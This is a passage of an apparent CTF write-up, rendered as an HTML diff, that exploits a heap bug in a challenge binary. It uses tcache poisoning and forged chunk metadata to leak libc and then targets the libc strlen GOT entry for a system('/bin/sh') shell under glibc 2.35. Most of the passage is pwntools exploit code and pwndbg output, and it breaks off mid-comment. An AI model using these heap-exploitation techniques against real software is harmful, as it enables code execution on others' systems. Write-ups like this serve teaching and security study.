+</span></span><span class="line"><span class="cl">0x561b6d1f3310:	0x0000000000000001	0x6262626262626262
+</span></span><span class="line"><span class="cl">0x561b6d1f3320:	0x6262626262626262	0x6262626262626262
+</span></span><span class="line"><span class="cl">0x561b6d1f3330:	0x0000000000000000	0x0000000000000021
+</span></span><span class="line"><span class="cl">0x561b6d1f3340:	0x0000561e0ca9e1e3	0x370a42ea29d203d9
+</span></span><span class="line"><span class="cl">0x561b6d1f3350:	0x6363636363636363	0x6363636363636363
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">pwndbg&gt; bins
+</span></span><span class="line"><span class="cl">tcachebins
+</span></span><span class="line"><span class="cl">0x30 [  2]: 0x561b6d1f3340 —▸ 0x561b6d1f3010 ◂— 0x561b4d1f3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As you can see, the freelist pointer value stored in <code>poisoned_chunk</code> is changed, so that after <code>demangling</code> it, it will points to <code>tcache_perthread_struct</code> instead of to <code>helper_chunk_b</code> address. Now, if we allocate two chunks with size 0x30, it will go to the <code>tcache_perthread_struct</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x33</span><span class="p">),</span> <span class="mh">0x18</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x18</span><span class="p">)</span> <span class="c1"># Call malloc, next allocation will be placed in the tcache_perthread_struct</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># This malloc will go to tcached_perthread_struct</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x34</span><span class="p">),</span> <span class="mh">0x18</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x7</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Now, we have successfully allocate a chunk to the tcache_perthread_struct</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># + we also overwrite the tcache[0xa0] size to 7, so that it is considered as full</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; tele 0x561b6c45e800
+</span></span><span class="line"><span class="cl">00:0000│  0x561b6c45e800 (MainTable+416) —▸ 0x561b6c45e540 (items+1248) ◂— 0x34 /* &#39;4&#39; */
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">pwndbg&gt; x/10gx 0x561b6c45e540
+</span></span><span class="line"><span class="cl">0x561b6c45e540 &lt;items+1248&gt;:	0x0000000000000034	0x0000561b6d1f3010 &lt;- HashMap with key 0x34 is mapped to tcache_perthread_struct address
+</span></span><span class="line"><span class="cl">0x561b6c45e550 &lt;items+1264&gt;:	0x0000000000000018	0x0000000000000035
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">pwndbg&gt; bins
+</span></span><span class="line"><span class="cl">tcachebins
+</span></span><span class="line"><span class="cl">0x20 [ 52]: 0x0
+</span></span><span class="line"><span class="cl">0x30 [  0]: 0x561b7d1f3
+</span></span><span class="line"><span class="cl">0xa0 [  7]: 0x0 &lt;- We have successfully fulfill the tcache[0xa0] bins
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now that we have succesfully forge the tcache bins, let&rsquo;s try to overwrite the <code>size</code> metadata of our <code>poisoned_chunk</code> to <code>0xa0</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Now, let forge the size of our poisoned_chunk to 0xa1 with the edit bug</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_metadata</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x20001</span><span class="p">),</span> <span class="n">key</span><span class="p">(</span><span class="mh">0x30001</span><span class="p">),</span> <span class="n">fake_metadata</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/80gx 0x561b6d1f3290
+</span></span><span class="line"><span class="cl">0x561b6d1f3290:	0x0000000000000000	0x0000000000000071
+</span></span><span class="line"><span class="cl">0x561b6d1f32a0:	0x0000000000000001	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32b0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32c0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32d0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32e0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32f0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f3300:	0x6161616161616161	0x0000000000000031
+</span></span><span class="line"><span class="cl">0x561b6d1f3310:	0x0000000000000001	0x6262626262626262
+</span></span><span class="line"><span class="cl">0x561b6d1f3320:	0x6262626262626262	0x6262626262626262
+</span></span><span class="line"><span class="cl">0x561b6d1f3330:	0x0000000000000000	0x00000000000000a1 &lt;- poisoned_chunk size metadata is updated to 0xa0
+</span></span><span class="line"><span class="cl">0x561b6d1f3340:	0x0000561e0ca90033	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f3350:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f3360:	0x0000000000000000	0x0000000000000031
+</span></span><span class="line"><span class="cl">0x561b6d1f3370:	0x0000000561b6d1f3	0x370a42ea29d203d9
+</span></span><span class="line"><span class="cl">0x561b6d1f3380:	0x6464646464646464	0x6464646464646464
+</span></span><span class="line"><span class="cl">0x561b6d1f3390:	0x0000000000000000	0x0000000000000021
+</span></span><span class="line"><span class="cl">0x561b6d1f33a0:	0x0000000000000035	0x6565656565656565
+</span></span><span class="line"><span class="cl">0x561b6d1f33b0:	0x0000000000000000	0x0000000000000031
+</span></span><span class="line"><span class="cl">0x561b6d1f33c0:	0x0000000000000036	0x6363636363636363
+</span></span><span class="line"><span class="cl">0x561b6d1f33d0:	0x0000000000000000	0x0000000000000041 &lt;- And if we free the poisoned_chunk, during security check on checking the next chunk, the next chunk is valid because we set this fake chunk metadata in the rune_contents with key 0x36
+</span></span><span class="line"><span class="cl">0x561b6d1f33e0:	0x0000000000000000	0x0000000000000031
+</span></span><span class="line"><span class="cl">0x561b6d1f33f0:	0x0000000000000037	0x6464646464646464
+</span></span><span class="line"><span class="cl">0x561b6d1f3400:	0x6464646464646464	0x6464646464646464
+</span></span><span class="line"><span class="cl">0x561b6d1f3410:	0x0000000000000000	0x0000000000000031
+</span></span><span class="line"><span class="cl">0x561b6d1f3420:	0x0000000000000038	0x6565656565656565
+</span></span><span class="line"><span class="cl">0x561b6d1f3430:	0x6565656565656565	0x6565656565656565
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And now, let&rsquo;s free it!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Free it, because the tcache[0xa0] is full, it will go to unsorted bin</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x33</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Now, poisoned_chunk contains libc address</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/80gx 0x561b6d1f3290
+</span></span><span class="line"><span class="cl">0x561b6d1f3290:	0x0000000000000000	0x0000000000000071
+</span></span><span class="line"><span class="cl">0x561b6d1f32a0:	0x0000000000000001	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32b0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32c0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32d0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32e0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f32f0:	0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x561b6d1f3300:	0x6161616161616161	0x0000000000000031
+</span></span><span class="line"><span class="cl">0x561b6d1f3310:	0x0000000000000001	0x6262626262626262
+</span></span><span class="line"><span class="cl">0x561b6d1f3320:	0x6262626262626262	0x6262626262626262
+</span></span><span class="line"><span class="cl">0x561b6d1f3330:	0x0000000000000000	0x00000000000000a1
+</span></span><span class="line"><span class="cl">0x561b6d1f3340:	0x00007fac6f9f2cc0	0x00007fac6f9f2cc0
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">pwndbg&gt; bins
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">unsortedbin
+</span></span><span class="line"><span class="cl">all: 0x561b6d1f3330 —▸ 0x7fac6f9f2cc0 (main_arena+96) ◂— 0x561b6d1f3330
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As you can see, the <code>poisoned_chunk</code> now contains libc address. To leak it, let&rsquo;s repeat the same method that we use to get the <code>heap</code> address leak like before. And also don&rsquo;t forget to fix the metadata back after we get the leak, just to ensure there isn&rsquo;t anything weird happen later.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Leak libc address by overflowing our main_chunk via the edit bug again</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># (just like before when we try to leak heap baddress)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x28</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x30001</span><span class="p">),</span> <span class="n">key</span><span class="p">(</span><span class="mh">0x10001</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">show</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x10001</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_libc_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leaked_libc_addr</span> <span class="o">-</span> <span class="mh">0x1f2cc0</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Fix its metadata (revert it just like before we overflow)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xa1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x10001</span><span class="p">),</span> <span class="n">key</span><span class="p">(</span><span class="mh">0x20001</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[*] libc base: 0x7fac6f800000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now that we&rsquo;ve got a libc leak, it&rsquo;s time to move to the last step.</p>
+<h4 id="gain-remote-code-execution-3">Gain Remote Code Execution</h4>
+<p>The binary is using <code>libc-2.35</code>, which means we can&rsquo;t use <code>__free_hook</code> anymore. The easiest trick to get a <code>system</code> in this glibc is we can try to overwrite the GOT entry of <code>strlen</code> in <code>libc</code>, so that when it called <code>puts(&quot;/bin/sh&quot;)</code>, it will trigger <code>system(&quot;/bin/sh&quot;)</code>, because <code>puts</code> will call <code>strlen</code> to the input string. I found this trick from this <a href="https://sechack.tistory.com/85" target="_blank" rel="noopener noreffer ">blog</a>.</p>
+<p>To do that, we will once again do the <code>tcache</code> poisoning, to allocate a chunk to the <code>strlen</code> GOT in libc. First, let&rsquo;s take a look on how the GOT looks like.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; tele 0x7fac6f9f2000 25
+</span></span><span class="line"><span class="cl">00:0000│  0x7fac6f9f2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1f1bc0
+</span></span><span class="line"><span class="cl">01:0008│  0x7fac6f9f2008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7fac6fb62000 —▸ 0x7fac6f800000 ◂— 0x3010102464c457f
+</span></span><span class="line"><span class="cl">02:0010│  0x7fac6f9f2010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7fac6fb7b2c0 (_dl_runtime_resolve_xsavec) ◂— endbr64 
+</span></span><span class="line"><span class="cl">03:0018│  0x7fac6f9f2018 (*ABS*@got.plt) —▸ 0x7fac6f9790a0 (__strnlen_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">04:0020│  0x7fac6f9f2020 (*ABS*@got.plt) —▸ 0x7fac6f974f50 (__rawmemchr_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">05:0028│  0x7fac6f9f2028 (realloc@got[plt]) —▸ 0x7fac6f82c030 ◂— endbr64 
+</span></span><span class="line"><span class="cl">06:0030│  0x7fac6f9f2030 (*ABS*@got.plt) —▸ 0x7fac6f976f00 (__strncasecmp_avx) ◂— endbr64 
+</span></span><span class="line"><span class="cl">07:0038│  0x7fac6f9f2038 (_dl_exception_create@got.plt) —▸ 0x7fac6f82c050 ◂— endbr64 
+</span></span><span class="line"><span class="cl">08:0040│  0x7fac6f9f2040 (*ABS*@got.plt) —▸ 0x7fac6f97bea0 (__mempcpy_avx_unaligned_erms) ◂— endbr64 
+</span></span><span class="line"><span class="cl">09:0048│  0x7fac6f9f2048 (*ABS*@got.plt) —▸ 0x7fac6f97c560 (__wmemset_avx2_unaligned) ◂— endbr64 
+</span></span><span class="line"><span class="cl">0a:0050│  0x7fac6f9f2050 (calloc@got[plt]) —▸ 0x7fac6f82c080 ◂— endbr64 
+</span></span><span class="line"><span class="cl">0b:0058│  0x7fac6f9f2058 (*ABS*@got.plt) —▸ 0x7fac6f9741c0 (__strspn_sse42) ◂— endbr64 
+</span></span><span class="line"><span class="cl">0c:0060│  0x7fac6f9f2060 (*ABS*@got.plt) —▸ 0x7fac6f974c80 (__memchr_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">0d:0068│  0x7fac6f9f2068 (*ABS*@got.plt) —▸ 0x7fac6f97bec0 (__memmove_avx_unaligned_erms) ◂— endbr64 
+</span></span><span class="line"><span class="cl">0e:0070│  0x7fac6f9f2070 (*ABS*@got.plt) —▸ 0x7fac6f97cb20 (__wmemchr_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">0f:0078│  0x7fac6f9f2078 (*ABS*@got.plt) —▸ 0x7fac6f97b0e0 (__stpcpy_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">10:0080│  0x7fac6f9f2080 (*ABS*@got.plt) —▸ 0x7fac6f97c720 (__wmemcmp_avx2_movbe) ◂— endbr64 
+</span></span><span class="line"><span class="cl">11:0088│  0x7fac6f9f2088 (_dl_find_dso_for_object@got.plt) —▸ 0x7fac6f82c0f0 ◂— endbr64 
+</span></span><span class="line"><span class="cl">12:0090│  0x7fac6f9f2090 (*ABS*@got.plt) —▸ 0x7fac6f97a780 (__strncpy_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">13:0098│  0x7fac6f9f2098 (*ABS*@got.plt) —▸ 0x7fac6f978f20 (__strlen_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">14:00a0│  0x7fac6f9f20a0 (*ABS*@got.plt) —▸ 0x7fac6f975894 (__strcasecmp_l_avx) ◂— endbr64 
+</span></span><span class="line"><span class="cl">15:00a8│  0x7fac6f9f20a8 (*ABS*@got.plt) —▸ 0x7fac6f97a3f0 (__strcpy_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">16:00b0│  0x7fac6f9f20b0 (*ABS*@got.plt) —▸ 0x7fac6f97d780 (__wcschr_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">17:00b8│  0x7fac6f9f20b8 (*ABS*@got.plt) —▸ 0x7fac6f978b40 (__strchrnul_avx2) ◂— endbr64 
+</span></span><span class="line"><span class="cl">18:00c0│  0x7fac6f9f20c0 (*ABS*@got.plt) —▸ 0x7fac6f9750c0 (__memrchr_avx2) ◂— endbr64
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The target is to overwrite <code>__strlen_avx2</code> to <code>system</code>. Notes that <code>__strlen_avx2</code> address is ended with <code>0x8</code>, which mean we can&rsquo;t set it directly to strlen GOT address because it will trigger alignment error. We also couldn&rsquo; set it to GOT - 0x8, because during allocation via <code>tcache</code>, the <code>entry+8</code> will be cleared to 0 (due to the logic inside <code>tcache</code> where it will clear the <code>tcache</code> key value), which means <code>strlen</code> will be set to 0 first during calling <code>malloc</code>. Check this LOCs of <strong>create</strong> function for the proof:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">      <span class="n">nbytes_4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">nbytes</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">strcpy</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">MainTable</span> <span class="o">+</span> <span class="n">v1</span><span class="p">),</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">MainTable</span> <span class="o">+</span> <span class="n">v1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">)</span> <span class="o">=</span> <span class="n">nbytes_4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">MainTable</span> <span class="o">+</span> <span class="n">v1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">16LL</span><span class="p">)</span> <span class="o">=</span> <span class="n">nbytes</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">strcpy</span><span class="p">(</span><span class="n">nbytes_4</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Rune contents: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">nbytes_4</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notice that before we were able to fill it, the binary call <code>puts(&quot;Rune contents:&quot;)</code>, and because <code>puts</code> has dependency to <code>strlen</code>, the binary will crash because the <code>strlen</code> is still <code>0</code> due to the <code>malloc</code>.</p>
+<p>So, the best place is to set the chunk address to GOT-0x18, so that during calling <code>malloc</code>, the <code>strlen</code> won&rsquo;t be cleared.</p>
+<p>Let&rsquo;s continue our previous script.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Remember that this allocation will still be placed in the exact same address as </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># our poisoned_chunk (which is adjacent to the main_chunk). The reason is because </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># there isn&#39;t any tcache[0x50] entries yet, so this allocation will take a place in </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># the unsorted bin chunk address, which is still adjacent to our main_chunk.</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x33</span><span class="p">),</span> <span class="mh">0x38</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x22</span><span class="p">),</span> <span class="mh">0x38</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x22</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="n">key</span><span class="p">(</span><span class="mh">0x33</span><span class="p">))</span> <span class="c1"># Now, as usual, poisoned_chunk contains address to heap chunk</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite it to strlen GOT - 0x18</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># We can&#39;t set it directly to strlen GOT because:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - It will trigger alignment error (because the last 8 bit of strlen GOT is 0x8)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># We alo can&#39;t set it to GOT - 0x8 because:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - During allocation via tcache, the entry+8 will be cleared to 0, which mean strlen</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   will be set to 0.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># - Before we were able to fill it, the binary call puts(&#34;Rune contents:&#34;), and because puts</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#   has dependency to strlen, the binary will crash.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># </span>
